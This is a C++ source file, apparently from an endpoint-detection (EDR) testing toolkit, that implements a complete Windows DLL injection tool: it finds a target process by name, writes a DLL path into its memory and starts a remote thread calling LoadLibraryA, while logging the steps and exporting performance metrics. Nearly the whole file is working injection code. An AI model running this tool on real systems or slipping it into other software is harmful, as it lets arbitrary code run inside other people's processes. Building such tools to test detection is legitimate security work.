﻿/*
 * DLL Injection with Performance Monitoring - EDR Testing Tools
 * Version 3: Enhanced with performance tracking
 * 
 * Enhancements in v3:
 * - Integrated PerformanceMonitor for detailed metrics
 * - Tracks execution time, memory usage, CPU, I/O
 * - Exports performance data to CSV/JSON
 * - Retains all v2 features (RAII, error handling, logging)
 * 
 * Features from v2:
 * - RAII-based resource management (HandleGuard, MemoryGuard)
 * - Structured exception handling with custom exceptions
 * - Comprehensive logging with Logger system
 * 
 * Performance Metrics Tracked:
 * - Execution time (microseconds)
 * - Memory usage (peak, current, delta)
 * - CPU usage (percentage, time)
 * - Disk I/O (read/write bytes and operations)
 * - Process information (PID, name)
 * 
 * Usage:
 *   dll_injection_v3.exe <target_process_name> <dll_path>
 *   Example: dll_injection_v3.exe notepad.exe C:\test\payload.dll
 * 
 * Build:
 *   cl dll_injection_v3.cpp /std:c++17 /EHsc /I..\..\include
 */

#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include "../../include/logger.hpp"
#include "../../include/error_handling.hpp"
#include "../../include/performance_monitor.hpp"

using namespace EDR;

// Constants
constexpr DWORD INJECTION_TIMEOUT = 5000; // 5 seconds

/*
 * Find process ID by name using CreateToolhelp32Snapshot
 * 
 * @param processName Name of the target process (e.g., "notepad.exe")
 * @return Process ID if found, 0 otherwise
 * 
 * Note: If multiple processes with the same name exist, returns the first match
 */
DWORD FindProcessByName(const std::string& processName) {
    LOG_INFO("Searching for process: " + processName);
    
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        LOG_ERROR("Failed to create process snapshot");
        throw Exception(ErrorCode::SYSTEM_CALL_FAILED, 
                       "Failed to create process snapshot",
                       "FindProcessByName", __FILE__, __LINE__);
    }
    
    HandleGuard snapshotGuard(hSnapshot);
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        LOG_ERROR("Failed to retrieve first process");
        throw Exception(ErrorCode::PROCESS_NOT_FOUND,
                       "Failed to retrieve process information",
                       "FindProcessByName", __FILE__, __LINE__);
    }
    
    do {
        if (processName == pe32.szExeFile) {
            DWORD pid = pe32.th32ProcessID;
            LOG_INFO("Found target process: " + processName + 
                    " (PID: " + std::to_string(pid) + ")");
            return pid;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    LOG_WARN("Process not found: " + processName);
    throw Exception(ErrorCode::PROCESS_NOT_FOUND,
                   "Target process not found: " + processName,
                   "FindProcessByName", __FILE__, __LINE__);
}

/*
 * Perform DLL injection with performance monitoring
 * 
 * @param processName Name of target process
 * @param dllPath Path to DLL to inject
 * @param monitor PerformanceMonitor reference for tracking
 * @return true if injection succeeds, false otherwise
 * 
 * Process:
 * 1. Start performance measurement
 * 2. Find target process by name
 * 3. Open process with required access rights
 * 4. Allocate memory in target process
 * 5. Write DLL path to allocated memory
 * 6. Create remote thread to call LoadLibraryA
 * 7. Wait for injection to complete
 * 8. Stop performance measurement and record results
 */
bool PerformDLLInjection(const std::string& processName, 
                        const std::string& dllPath,
                        PerformanceMonitor& monitor) {
    
    // Start performance measurement
    monitor.StartMeasurement("DLL Injection",
                            "Inject " + dllPath + " into " + processName);
    
    try {
        LOG_INFO("=== Starting DLL Injection ===");
        LOG_INFO("Target Process: " + processName);
        LOG_INFO("DLL Path: " + dllPath);
        
        // Step 1: Find target process
        DWORD targetPID = FindProcessByName(processName);
        
        // Step 2: Open target process
        LOG_INFO("Opening target process...");
        HANDLE hProcess = OpenProcess(
            PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | 
            PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
            FALSE,
            targetPID
        );
        
        if (!hProcess) {
            DWORD error = GetLastError();
            LOG_ERROR("Failed to open process. Error code: " + 
                     std::to_string(error));
            throw Exception(ErrorCode::PROCESS_ACCESS_DENIED,
                           "Failed to open target process (Error: " + 
                           std::to_string(error) + ")",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        HandleGuard processGuard(hProcess);
        LOG_INFO("Successfully opened target process");
        
        // Step 3: Allocate memory in target process
        size_t dllPathSize = dllPath.length() + 1;
        LOG_INFO("Allocating " + std::to_string(dllPathSize) + 
                " bytes in target process...");
        
        LPVOID pRemoteMemory = VirtualAllocEx(
            hProcess,
            NULL,
            dllPathSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        );
        
        if (!pRemoteMemory) {
            DWORD error = GetLastError();
            LOG_ERROR("Failed to allocate memory. Error code: " + 
                     std::to_string(error));
            throw Exception(ErrorCode::MEMORY_ALLOCATION_FAILED,
                           "Failed to allocate memory in target process",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        MemoryGuard memoryGuard(hProcess, pRemoteMemory, dllPathSize);
        LOG_INFO("Memory allocated at: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(pRemoteMemory)));
        
        // Step 4: Write DLL path to allocated memory
        LOG_INFO("Writing DLL path to target process memory...");
        SIZE_T bytesWritten;
        if (!WriteProcessMemory(hProcess, pRemoteMemory, 
                               dllPath.c_str(), dllPathSize, &bytesWritten)) {
            DWORD error = GetLastError();
            LOG_ERROR("Failed to write memory. Error code: " + 
                     std::to_string(error));
            throw Exception(ErrorCode::MEMORY_WRITE_FAILED,
                           "Failed to write DLL path to target process",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        LOG_INFO("Successfully wrote " + std::to_string(bytesWritten) + " bytes");
        
        // Step 5: Get LoadLibraryA address
        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
        if (!hKernel32) {
            LOG_ERROR("Failed to get kernel32.dll handle");
            throw Exception(ErrorCode::DLL_NOT_FOUND,
                           "Failed to get kernel32.dll handle",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        LPVOID pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
        if (!pLoadLibrary) {
            LOG_ERROR("Failed to get LoadLibraryA address");
            throw Exception(ErrorCode::API_NOT_AVAILABLE,
                           "Failed to get LoadLibraryA address",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        LOG_INFO("LoadLibraryA address: 0x" + 
                std::to_string(reinterpret_cast<uintptr_t>(pLoadLibrary)));
        
        // Step 6: Create remote thread
        LOG_INFO("Creating remote thread...");
        HANDLE hThread = CreateRemoteThread(
            hProcess,
            NULL,
            0,
            reinterpret_cast<LPTHREAD_START_ROUTINE>(pLoadLibrary),
            pRemoteMemory,
            0,
            NULL
        );
        
        if (!hThread) {
            DWORD error = GetLastError();
            LOG_ERROR("Failed to create remote thread. Error code: " + 
                     std::to_string(error));
            throw Exception(ErrorCode::THREAD_CREATION_FAILED,
                           "Failed to create remote thread",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        HandleGuard threadGuard(hThread);
        LOG_INFO("Remote thread created successfully");
        
        // Step 7: Wait for injection to complete
        LOG_INFO("Waiting for injection to complete...");
        DWORD waitResult = WaitForSingleObject(hThread, INJECTION_TIMEOUT);
        
        if (waitResult == WAIT_TIMEOUT) {
            LOG_WARN("Injection timeout after " + 
                    std::to_string(INJECTION_TIMEOUT) + " ms");
            throw Exception(ErrorCode::REMOTE_THREAD_FAILED,
                           "Remote thread execution timeout",
                           "PerformDLLInjection", __FILE__, __LINE__);
        }
        
        // Check thread exit code
        DWORD exitCode;
        if (GetExitCodeThread(hThread, &exitCode)) {
            if (exitCode == 0) {
                LOG_ERROR("LoadLibraryA failed in target process");
                throw Exception(ErrorCode::INJECTION_FAILED,
                               "LoadLibraryA returned NULL",
                               "PerformDLLInjection", __FILE__, __LINE__);
            }
            LOG_INFO("LoadLibraryA returned: 0x" + 
                    std::to_string(exitCode) + " (DLL base address)");
        }
        
        LOG_INFO("=== DLL Injection Completed Successfully ===");
        
        // Mark as successful
        monitor.SetSuccess(true);
        
        // Stop measurement and get metrics
        auto metrics = monitor.StopMeasurement();
        
        // Print immediate metrics
        std::cout << "\n[Performance Metrics]\n";
        std::cout << "  Execution Time: " 
                  << (metrics.executionTime.count() / 1000.0) << " ms\n";
        std::cout << "  Peak Memory: " 
                  << (metrics.peakMemoryUsage / 1024.0 / 1024.0) << " MB\n";
        std::cout << "  CPU Usage: " << metrics.cpuUsagePercent << " %\n";
        
        return true;
        
    } catch (const Exception& e) {
        LOG_ERROR("DLL Injection failed: " + std::string(e.what()));
        std::cerr << "[-] Error: " << e.what() << "\n";
        std::cerr << "[-] Error Code: " << static_cast<int>(e.code()) << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
        
    } catch (const std::exception& e) {
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        std::cerr << "[-] Unexpected error: " << e.what() << "\n";
        
        monitor.SetSuccess(false);
        monitor.StopMeasurement();
        return false;
    }
}

int main(int argc, char* argv[]) {
    try {
        // Initialize logger
        auto& logger = Logger::Instance();
        logger.SetLevel(EDRLOG_INFO);
        logger.SetOutputFile("dll_injection_v3.log");
        logger.EnableConsole(true);
        
        LOG_INFO("=== DLL Injection v3 with Performance Monitoring Started ===");
        
        std::cout << "======================================================\n";
        std::cout << "    DLL Injection v3 - Performance Monitoring\n";
        std::cout << "======================================================\n\n";
        
        // Check arguments
        if (argc != 3) {
            std::cerr << "Usage: " << argv[0] 
                     << " <target_process> <dll_path>\n";
            std::cerr << "Example: " << argv[0] 
                     << " notepad.exe C:\\test\\payload.dll\n";
            return 1;
        }
        
        std::string processName = argv[1];
        std::string dllPath = argv[2];
        
        // Validate DLL path
        DWORD attrs = GetFileAttributesA(dllPath.c_str());
        if (attrs == INVALID_FILE_ATTRIBUTES) {
            std::cerr << "[-] DLL file not found: " << dllPath << "\n";
            LOG_ERROR("DLL file not found: " + dllPath);
            return 1;
        }
        
        // Create performance monitor
        PerformanceMonitor monitor;
        
        // Perform injection with performance tracking
        bool success = PerformDLLInjection(processName, dllPath, monitor);
        
        if (success) {
            std::cout << "\n[+] Injection completed successfully!\n";
            
            // Print detailed summary
            std::cout << "\n";
            monitor.PrintSummary();
            
            // Export performance data
            std::cout << "\nExporting performance data...\n";
            try {
                monitor.ExportToCSV("dll_injection_performance.csv");
                std::cout << "[+] CSV exported: dll_injection_performance.csv\n";
                
                monitor.ExportToJSON("dll_injection_performance.json");
                std::cout << "[+] JSON exported: dll_injection_performance.json\n";
                
            } catch (const Exception& e) {
                std::cerr << "[-] Export failed: " << e.what() << "\n";
            }
            
            return 0;
            
        } else {
            std::cerr << "\n[-] Injection failed!\n";
            std::cerr << "Check dll_injection_v3.log for details.\n";
            return 1;
        }
        
    } catch (const Exception& e) {
        std::cerr << "\n[FATAL ERROR] " << e.what() << "\n";
        std::cerr << "Error Code: " << static_cast<int>(e.code()) << "\n";
        LOG_ERROR("Fatal error: " + std::string(e.what()));
        return 1;
        
    } catch (const std::exception& e) {
        std::cerr << "\n[FATAL ERROR] Unexpected: " << e.what() << "\n";
        LOG_ERROR("Unexpected error: " + std::string(e.what()));
        return 1;
        
    } catch (...) {
        std::cerr << "\n[FATAL ERROR] Unknown error occurred\n";
        LOG_ERROR("Unknown fatal error");
        return 1;
    }
}
